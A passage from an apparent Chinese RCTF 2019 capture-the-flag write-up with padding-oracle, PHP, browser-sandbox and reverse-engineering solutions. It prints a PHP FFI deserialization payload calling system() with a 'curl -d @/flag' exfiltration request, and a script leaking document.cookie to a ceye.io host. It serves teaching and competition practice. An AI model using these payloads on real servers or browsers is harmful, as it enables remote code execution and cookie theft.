class="string">"\x00"</span> * (<span class="number">16</span> - x) + chr(y) + <span class="string">""</span>.join(chr(ord(i) ^ x) <span class="keyword">for</span> i <span class="keyword">in</span> middle)</span><br><span class="line"></span><br><span class="line">​    payload = IV.encode(<span class="string">"hex"</span>) + c.encode(<span class="string">"hex"</span>) + hv_hex.encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">​    target.recvuntil(<span class="string">"Input your cookie:\n"</span>)</span><br><span class="line"></span><br><span class="line">​    target.sendline(payload)</span><br><span class="line"></span><br><span class="line">​    result = target.recvuntil(<span class="string">"\n"</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> <span class="string">"Invalid hash"</span> <span class="keyword">in</span> result:</span><br><span class="line"></span><br><span class="line">​        middle = chr(y ^ x) + middle</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">print</span> <span class="string">"[!]Get: "</span> + middle.encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> y == <span class="number">255</span>:</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">print</span> <span class="string">"[!]Error"</span></span><br><span class="line"></span><br><span class="line">​        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> middle</span><br><span class="line"></span><br><span class="line">fake_cipher4 = cipher[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">"fake_cipher4 ok"</span>)</span><br><span class="line"></span><br><span class="line">middle4 = xor(iv, <span class="string">"admin:0;username"</span>)</span><br><span class="line"></span><br><span class="line">fake_cipher3 = xor(middle4, <span class="string">";admin:1"</span> + <span class="string">"\x08"</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"fake_cipher3 ok"</span>)</span><br><span class="line"></span><br><span class="line">middle3 = padding_oracle(fake_cipher3)</span><br><span class="line"></span><br><span class="line">fake_cipher2 = xor(middle3, i_need[<span class="number">32</span>:])</span><br><span class="line"></span><br><span class="line">success(<span class="string">"fake_cipher2 ok"</span>)</span><br><span class="line"></span><br><span class="line">middle2 = padding_oracle(fake_cipher2)</span><br><span class="line"></span><br><span class="line">fake_cipher1 = xor(middle2, i_need[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">success(<span class="string">"fake_cipher1 ok"</span>)</span><br><span class="line"></span><br><span class="line">middle1 = padding_oracle(fake_cipher1)</span><br><span class="line"></span><br><span class="line">fake_iv = xor(middle1, i_need[:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> fake_iv.encode(<span class="string">"hex"</span>) + (fake_cipher1 + fake_cipher2 + fake_cipher3 + fake_cipher4).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hv_hex.encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br><span class="line"></span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure></p><p>然后再用hashpump就行</p><h2><span id="web">WEB</span></h2><h3><span id="nextphp">nextphp</span></h3><p>http://nextphp.2019.rctf.rois.io</p><p>直接给了可以源码，可以执行代码，拥有webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个web目录没有文件写入权限，查看phpinfo发现禁用了很多函数(<code>putenv</code>,<code>error_log</code>,<code>dl</code>等常见关键函数也被禁用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure><p>环境是php7.4，并且开启了opcache.preload选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opcache.preload       /var/www/html/preload.php</span><br></pre></td></tr></table></figure><p>与这个先关的还有个<code>FFI</code>拓展，<code>Configure Command</code>已经安装并且激活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;./configure&apos; &apos;--build=x86_64-linux-gnu&apos; &apos;--with-config-file-path=/usr/local/etc/php&apos; &apos;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&apos; &apos;--with-ffi&apos; &apos;--enable-option-checking=fatal&apos; &apos;--with-mhash&apos; &apos;--enable-ftp&apos; &apos;--enable-mbstring&apos; &apos;--enable-mysqlnd&apos; &apos;--with-password-argon2&apos; &apos;--with-sodium&apos; &apos;--with-curl&apos; &apos;--with-libedit&apos; &apos;--with-openssl&apos; &apos;--with-zlib&apos; &apos;--with-pear&apos; &apos;--with-libdir=lib/x86_64-linux-gnu&apos; &apos;--with-apxs2&apos; &apos;--disable-cgi&apos; &apos;build_alias=x86_64-linux-gnu&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI supportenabled</span><br></pre></td></tr></table></figure><p>什么是FFI？</p><p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p><p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。</p><p>阅读RFC(https://wiki.php.net/rfc/FFI)，可以配合opcache.preload调用c库完成代码执行</p><ul><li><strong>ffi.enable=false</strong> completely disables PHP FFI API</li><li><strong>ffi.enable=true</strong> enables PHP FFI API without any restrictions</li><li><strong>ffi.enable=preload</strong> (the default value) enables FFI but restrict its usage to CLI and preloaded scripts</li></ul><p>利用cdef的反序列脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $data = [</span><br><span class="line"><span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line"><span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line"><span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line"><span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line"><span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> (serialize($a));</span><br></pre></td></tr></table></figure><p>获取flag请求，system没有回显，需要外带数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$c=unserialize(base64_decode(&apos;QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319&apos;));$c-&gt;ret-&gt;system(&quot;curl -d @/flag vps&quot;);</span><br></pre></td></tr></table></figure><h3><span id="jail">jail</span></h3><p>HINIT，<code>meta</code>标签无法使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: hint1=flag1_is_in_cookie</span><br><span class="line">Set-Cookie: hint2=meta_refresh_is_banned_in_server</span><br></pre></td></tr></table></figure><p>CSP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: sandbox allow-scripts allow-same-origin; base-uri &apos;none&apos;;default-src &apos;self&apos;;script-src &apos;unsafe-inline&apos; &apos;self&apos;;connect-src &apos;none&apos;;object-src &apos;none&apos;;frame-src &apos;none&apos;;font-src data: &apos;self&apos;;style-src &apos;unsafe-inline&apos; &apos;self&apos;;</span><br></pre></td></tr></table></figure><p><code>location.href</code>对象无法使用，但是我们可以使用<code>location.host</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="function"><span class="keyword">function</span> <span class="title">strToHexCharCode</span>(<span class="params">str</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (str === <span class="string">""</span>) <span class="keyword">return</span> <span class="string">""</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> hexCharCode = [];</span></span><br><span class="line"><span class="javascript">    hexCharCode.push(<span class="string">"0x"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span></span><br><span class="line"><span class="undefined">        hexCharCode.push((str.charCodeAt(i)).toString(16));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> hexCharCode.join(<span class="string">""</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">location.host = strToHexCharCode(<span class="built_in">document</span>.cookie).substring(<span class="number">60</span>, <span class="number">90</span>) + <span class="string">`.hdftk4.ceye.io`</span>; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本来是是用base64的，后来发现会有大小写和+/之类的问题，所以最后使用的十六进制。</p><p>然后用ceye去接收就好了~</p><h2><span id="re">RE</span></h2><h3><span id="babyre">babyre</span></h3><p>输入长度16，0-9a-z，然后转hex转字节</p><p>之后用xxtea解密。根据提示，解密后要为Bingo!。xxtea最后一段逻辑，根据解密的最后一个字节的大小x，把明文倒数第x位用\0截断。</p><p>得到的明文先CRC16/CCITT，结果要为0x69E2。</p><p>明文每一位再异或0x17，然后输出。</p><p>即解密完应该是Bingo!异或0x17。</p><p>由于输出Bingo!，所以最后一位应该是，这样截断完再异或0x17就是Bingo!了。</p><p>这样我们得到了明文的前六位和最后一位，还差1位，这时可以用题目给出的hint爆出来。</p><p>也可以不爆破。因为根据用最后一位截断，可以推断出加密时的padding是用剩余字节数padding。即明文最后两位都是。</p><p>网上抄的xxtea代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pch.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX ((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4) ^ (sum^y) + (k[p&amp;3^e]^z))</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">btea</span><span class="params">(<span class="keyword">long</span>* v, <span class="keyword">long</span> n, <span class="keyword">long</span>* k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x9e3779b9</span>;</span><br><span class="line"><span class="keyword">long</span> p, q;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line"><span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">n = -n;</span><br><span class="line">q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = q * DELTA;</span><br><span class="line"><span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> cipher[] = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> cipher1[] = <span class="string">"Bingo!\x02\x02"</span>;</span><br><span class="line"><span class="keyword">long</span> key[] = &#123; <span class="number">0xE0C7E0C7</span>, <span class="number">0xC6F1D3D7</span>, <span class="number">0xC6D3C6D3</span>, <span class="number">0xC4D0D2CE</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">cipher1[i] ^= <span class="number">0x17</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(cipher, cipher1, <span class="number">8</span>);</span><br><span class="line">btea(cipher, <span class="number">2</span>, key);</span><br><span class="line"><span class="keyword">char</span> *b = (<span class="keyword">char</span> *)cipher;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"rctf&#123;"</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> c1 = *(b + i) &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>;</span><br><span class="line"><span class="keyword">char</span> c2 = *(b + i) &amp; <span class="number">0xF</span>;</span><br><span class="line"><span class="keyword">if</span> (c1 &lt; <span class="number">10</span>)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(c1 + <span class="number">0x30</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(c1 + <span class="number">0x61</span> - <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (c2 &lt; <span class="number">10</span>)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(c2 + <span class="number">0x30</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(c2 + <span class="number">0x61</span> - <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rctf{05e8a376e4e0446e}</p><h3><span id="babyre2">babyre2</span></h3><p>输入account,password,data。</p><p>还是xxtea，先用account作为key，加密一组常量。</p><p>password的每一位减去十位和个位，减去的结果作为下标从data取数据，得到data2.</p><p>用data2异或0xCC作为key密之前的密文。</p><p>于是直接构造account:'A'*16，data'8D'*256，password随便16位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./babyre2'</span>)</span><br><span class="line"><span class="comment">#p = remote('139.180.215.222','20000')</span></span><br><span class="line">p.recvuntil(<span class="string">'Please input the account:'</span>)</span><br><span class="line">p.send(<span class="string">'A'</span>*<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please input the password:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please input the data:'</span>)</span><br><span class="line">p.send(<span class="string">'8D'</span>*<span class="number">256</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="donteatme">DontEatMe</span></h3><p>开始有个反调试，直接跳过。</p><p>做的时候不清楚是啥加密，搜了一些常量也搜不到，于是自己逆。由于是Feistel密码结构，所以直接反向就可以了。</p><p>得到密文后，根据常量生成了一个迷宫，密文应是wasd来控制方向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1111111111111111</span><br><span class="line">1000000000111111</span><br><span class="line">1011111110111111</span><br><span class="line">1011111110111111</span><br><span class="line">101111000!000111</span><br><span class="line">1011110111110111</span><br><span class="line">1011110111110111</span><br><span class="line">1011110000110111</span><br><span class="line">1011111110110111</span><br><span class="line">1011111110110111</span><br><span class="line">10000&gt;0000110111</span><br><span class="line">1111101111110111</span><br><span class="line">1111100000000111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br></pre></td></tr></table></figure><p>密文：</p><p>ddddwwwaaawwwddd</p><p>解密：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pch.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">unsigned int const0[] = &#123; 0x459FC5A5, ... &#125;;</span></span><br><span class="line"><span class="comment">unsigned int const1[] = &#123; 0x3B928883, ...&#125;;</span></span><br><span class="line"><span class="comment">unsigned int const2[] = &#123; 0x5E476C95, ... &#125;;</span></span><br><span class="line"><span class="comment">unsigned int const3[] = &#123; 0x0DA579091, ... &#125;;</span></span><br><span class="line"><span class="comment">unsigned int delta[] = &#123; 0x0CDC56A63, ... &#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">int</span> a, b;</span><br><span class="line"><span class="keyword">int</span> tmp;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//encrypt</span></span><br><span class="line"><span class="comment">int plain[] = &#123; 0x11223344,0x55667788 &#125;;</span></span><br><span class="line"><span class="comment">a = plain[0];</span></span><br><span class="line"><span class="comment">b = plain[1];</span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; 16; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">unsigned int i0, i1, i2, i3;</span></span><br><span class="line"><span class="comment">tmp = delta[15-i] ^ a;</span></span><br><span class="line"><span class="comment">i0 = (tmp &gt;&gt; 24)&amp;0xff;</span></span><br><span class="line"><span class="comment">i1 = (tmp &gt;&gt; 16) &amp; 0xff;</span></span><br><span class="line"><span class="comment">i2 = (tmp &gt;&gt; 8) &amp; 0xff;</span></span><br><span class="line"><span class="comment">i3 = tmp &amp; 0xff;</span></span><br><span class="line"><span class="comment">a = b ^ (const3[i3] + (const2[i2] ^ (const1[i1] + const0[i0])));</span></span><br><span class="line"><span class="comment">b = tmp;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;hex &lt;&lt; a &lt;&lt;' '&lt;&lt; b &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">b ^= 0xC12083C0;</span></span><br><span class="line"><span class="comment">a ^= 0x6809DCE2;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; hex &lt;&lt; a &lt;&lt; ' ' &lt;&lt; b&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//decrypt</span></span><br><span class="line"><span class="keyword">int</span> cipher[] = &#123; <span class="number">0x77646464</span>, <span class="number">0x61617777</span> ,<span class="number">0x77777761</span>, <span class="number">0x64646464</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">a = cipher[j * <span class="number">2</span>];</span><br><span class="line">b = cipher[j * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">a ^= <span class="number">0x6809DCE2</span>;</span><br><span class="line">b ^= <span class="number">0xC12083C0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp = b;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i0, i1, i2, i3;</span><br><span class="line">i0 = (tmp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">i1 = (tmp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">i2 = (tmp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">i3 = tmp &amp; <span class="number">0xff</span>;</span><br><span class="line">b = a ^ (const3[i3] + (const2[i2] ^ (const1[i1] + const0[i0])));</span><br><span class="line">a = tmp ^ delta[i];</span><br><span class="line">&#125;</span><br><span class="line"><span 